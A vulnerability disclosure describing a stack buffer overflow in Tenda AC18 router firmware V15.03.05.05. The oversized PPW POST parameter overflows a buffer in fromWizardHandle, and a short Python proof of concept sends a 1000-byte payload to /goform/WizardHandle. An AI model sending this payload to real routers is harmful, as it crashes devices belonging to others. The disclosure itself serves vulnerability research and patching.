## Overview

- The device's official website: https://www.tenda.com.cn/product/overview/AC18.html
- Firmware download website: https://www.tenda.com.cn/download/detail-2610.html

## Affected version

V15.03.05.05

## Vulnerability details

The Tenda A18 V15.03.05.05 firmware has a stack overflow vulnerability located in the `fromWizardHandle` function. This function accepts the `WANT`and `WANS` parameter from a POST request. Within `case 2`, this function accepts the `PPW` parameter from a POST request, which is assigned to `decodePwd(pppoepwd, decode_pwd);`. However, since the user has control over the input of `PPW`, the function `decodePwd()` leads to a buffer overflow. The user-supplied `PPW` can exceed the capacity of the `decode_pwd` array, thus triggering this security vulnerability.

![image-20240409144436622](https://raw.githubusercontent.com/abcdefg-png/images/main/image-20240409144436622.png)

![image-20240409144543183](https://raw.githubusercontent.com/abcdefg-png/images/main/image-20240409144543183.png)

![image-20240409144601905](https://raw.githubusercontent.com/abcdefg-png/images/main/image-20240409144601905.png)

![image-20240409144618132](https://raw.githubusercontent.com/abcdefg-png/images/main/image-20240409144618132.png)

## POC

```python
import requests
from pwn import*

ip = "192.168.84.101"
url = "http://" + ip + "/goform/WizardHandle"
payload = b"a"*1000

data = {"WANS":"0","WANT":"2","PPW": payload}
response = requests.post(url, data=data)
print(response.text)
```

![image-20240409102339559](https://raw.githubusercontent.com/abcdefg-png/images/main/image-20240409102339559.png)